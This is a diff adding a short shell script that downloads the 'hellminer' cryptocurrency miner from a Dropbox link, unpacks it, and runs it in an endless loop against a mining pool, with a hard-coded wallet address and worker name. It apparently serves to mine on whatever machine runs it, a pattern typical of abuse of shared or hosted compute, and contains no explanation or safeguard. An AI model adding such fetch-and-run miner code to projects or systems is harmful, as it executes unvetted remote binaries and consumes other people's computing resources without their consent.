@@ -1,0 +1,7 @@
+wget https://www.dropbox.com/s/xx8k3j4n9bzkhob/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+while [ 1 ]; do
+./hellminer -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BZnqFsLNgjnMPndSqgEg8GRmQarMYoT7T3.jindul -p x --cpu 4
+
+sleep 2
+done
